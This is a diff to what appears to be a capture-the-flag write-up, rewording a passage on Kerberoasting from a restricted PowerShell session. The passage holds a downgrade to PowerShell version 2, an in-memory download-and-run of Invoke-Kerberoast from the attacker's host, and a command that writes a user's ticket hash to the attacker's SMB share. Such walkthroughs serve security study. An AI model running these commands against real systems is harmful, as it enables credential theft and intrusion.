@@ -336,11 +336,12 @@ I wanted to get a `nishang` shell but couldn't do the `IEX` command (`Invoke-Exp
 
 *Fortunately,* it can be bypassed by *downgrading* to **PowerShell** version 2.
 
-We're going to be abusing the `Start-Process` command to start a `powershell.exe` with `-v 2` for the downgrade and the command `-c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/Invoke-Kerberoast.ps1')` as arguments.
+We're going to be abusing the `Start-Process` command to start a `powershell.exe` with `-v 2` and the command `-c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/Invoke-Kerberoast.ps1')` as arguments.
 
 This is to:
-1. Import the `Invoke-Kerberoast` code into memory
-2. Execute the command `Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII \\10.10.16.7\share\roasted.txt`
+1. Start a **PowerShell** version 2 process without locking the terminal.
+1. Import the `Invoke-Kerberoast` code into memory.
+2. Execute the command `Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII \\10.10.16.7\share\roasted.txt`.
 3. Output the TGS hash of the `mrlky` user to our SMB share.
 
 we will use the `-Credential` paramer with `Start-Process` to create the needed Network Authentication for the attack to succeed.
